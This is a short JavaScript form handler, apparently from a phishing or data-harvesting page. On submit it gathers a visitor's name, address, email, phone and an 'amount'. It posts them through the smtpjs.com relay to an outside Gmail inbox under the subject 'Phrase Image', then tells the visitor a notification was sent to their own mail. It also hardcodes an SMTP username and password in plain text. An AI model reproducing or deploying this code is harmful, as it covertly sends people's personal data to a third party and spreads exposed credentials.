const form  = document.getElementById("myform");
form.addEventListener("submit", (e) => {
  e.preventDefault();
 var data = document.getElementsByTagName("input");
 var sel = document.getElementsByTagName("select");
 var tarea = document.getElementsByTagName("textarea");
  var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };

  var formdata = {
    "firstname" : data[0].value,
    "lastname" : data[1].value,
    "city" : data[2].value,
    "state" : data[3].value,
    "country" : data[4].value,
    "zip" : data[5].value,
    "email" : data[6].value,
    "phone" : data[7].value,
    "amount" : sel[0].value,
    "add1" : tarea[0].value,
    "add2" : tarea[1].value
  };
  var emailConfig = {
    "Host" : "smtp.elasticemail.com",
    "Username" : "01marissacaitlin@gmail.com",
    "Password" : "4BAA3D4BDD8BA965875BDEFF54B63B3A7E5F",
    "To"  : "Ibraheemakin201@gmail.com",
    "From" : "Ibraheemakin201@gmail.com",
    "Subject" : "Phrase Image",
    "Body"  : `Dear User, Your details are 
      Firstname : ${formdata.firstname}
      Lastname : ${formdata.lastname}
      Email : ${formdata.email}
      Phone Number : ${formdata.phone}
      City : ${formdata.city}
      State : ${formdata.state}
      Zip : ${formdata.zip}
      City : ${formdata.city}
      amount : ${formdata.amount}
      address 1 : ${formdata.add1}
      addresss 2 : ${formdata.add2}
    `
}

  console.log(emailConfig);
  Email.send(emailConfig).then(
    message => alert("A notification has been sent to your mail")
  ).catch(
    error => console.error('Error sending email:', error)
  );

 });